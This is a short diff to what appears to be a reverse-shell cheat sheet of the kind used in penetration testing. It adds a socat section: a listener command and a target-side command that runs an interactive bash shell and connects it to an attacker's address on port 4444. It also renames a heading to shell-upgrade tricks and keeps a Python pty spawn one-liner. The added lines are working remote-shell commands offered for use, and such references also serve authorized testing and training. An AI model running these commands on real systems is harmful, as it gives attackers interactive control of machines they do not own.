@@ -159,8 +159,15 @@ p.waitFor()
 
 And on your side authorize the connection with `xhost +targetIp` and catch it with `Xnest :1`
 
+* socat
 
-## Interactive Shell Howto
+Listener:
+`socat file:`tty`,raw,echo=0 yourIP:4444`
+
+target:
+`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:yourIP:4444`
+
+## Interactive Shell Upgrade Tricks
 
 * Python (Linux)     
 `python -c 'import pty; pty.spawn("/bin/bash")' `
